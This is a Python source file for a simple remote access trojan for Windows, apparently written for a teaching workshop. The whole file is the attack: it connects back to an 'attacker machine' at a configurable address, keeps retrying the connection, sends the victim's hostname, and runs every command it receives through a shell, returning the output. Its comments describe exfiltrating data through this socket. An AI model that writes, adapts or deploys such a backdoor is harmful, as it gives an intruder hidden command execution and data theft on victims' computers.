##################################
# this is the python file for 
# a simple RAT to work on window
# by Ishan Saha
##################################

#Imports 
import subprocess
import socket
import time
import os

#Static Variables change the ip and the port accordingly
# if no ip given then it will take the loopback ip
RHOST =('127.0.0.1',8080)

#Main function
def main():

	# creating the socket to connect to the Attacker machine
	# as I told you People in the workshop that there must be a 
	# socket through which the data will be exfilterated and the
	# commands will be recieved
	ClinetSocket = socket.socket()
	# the following commands sets the option to make the port in question
	# reusable if it was earlier being used 
	ClinetSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)


	# this try statement tries to make the connecting if the
	# internet is not working then it will wait for 50 mili seconds
	# and then try to reconnect 
	try:
		ClinetSocket.connect(RHOST)
	except:
		#ClinetSocket.shutdown(socket.SHUT_RDWR)
		ClinetSocket.close()
		time.sleep(10)
		main()

	#send the victim computer name
	ClinetSocket.send(socket.gethostname().encode('ascii'))
	# infinite loop to make the interaction always going on
	while True:
		#getting the data in the string format form the binary into the ascii format
		data=str(ClinetSocket.recv(1024).decode('ascii'))
		cmd=data.split(' ') 
		if 'exit' in cmd:
			break
		elif 'cd' in cmd:
			# this is to change the directory
			try:
				os.chdir(cmd[1])
				ClinetSocket.send(True)
			except Exception as e:
				ClinetSocket.send(e.encode('ascii'))
		
		else:
			Output = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE).communicate()[0]
			ClinetSocket.send(Output)

main()